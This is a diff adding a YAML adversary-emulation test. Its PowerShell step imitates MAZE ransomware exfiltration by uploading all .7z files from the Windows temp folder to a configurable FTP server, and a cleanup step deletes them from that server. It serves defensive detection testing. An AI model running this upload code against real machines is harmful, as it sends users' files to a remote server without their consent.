@@ -1,0 +1,49 @@
+api_version: "2.0"
+name: MAZE FTP Upload
+description: "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n"
+args:
+    - name: ftp_server
+      type: string
+      default: 127.0.0.1
+    - name: username
+      type: string
+      default: <nil>
+    - name: password
+      type: string
+      default: <nil>
+uuid: 57799bc2-ad1e-4130-a793-fb0c385130ba
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1048: Exfiltration Over Alternative Protocol'
+    subtechniques:
+        - 'T1048.003: Exfiltration Over Unencrypted Non-C2 Protocol'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: maze-ftp-upload
+      inline: |
+        $Dir_to_copy = "$env:windir\temp"
+        $ftp = "ftp://{{.Args.ftp_server}}/"
+        $web_client = New-Object System.Net.WebClient
+        $web_client.Credentials = New-Object System.Net.NetworkCredential('{{.Args.username}}', '{{.Args.password}}')
+        if (test-connection -count 1 -computername "{{.Args.ftp_server}}" -quiet)
+        {foreach($file in (dir $Dir_to_copy "*.7z"))
+        {echo "Uploading $file..."
+        $uri = New-Object System.Uri($ftp+$file.name)
+        $web_client.UploadFile($uri, $file.FullName)}}
+        else
+        {echo "FTP Server Unreachable. Please verify the server address in input args and try again."}
+      executor: powershell
+      cleanup:
+        inline: |
+            $ftp = "ftp://{{.Args.ftp_server}}/"
+            try {foreach ($file in (dir "$env:windir\temp" "*.7z"))
+            {$uri = New-Object System.Uri($ftp+$file.name)
+             $ftp_del = [System.Net.FtpWebRequest]::create($uri)
+             $ftp_del.Credentials = New-Object System.Net.NetworkCredential('{{.Args.username}}','{{.Args.password}}')
+             $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile
+             $ftp_del.GetResponse()}} catch{}
+        executor: powershell
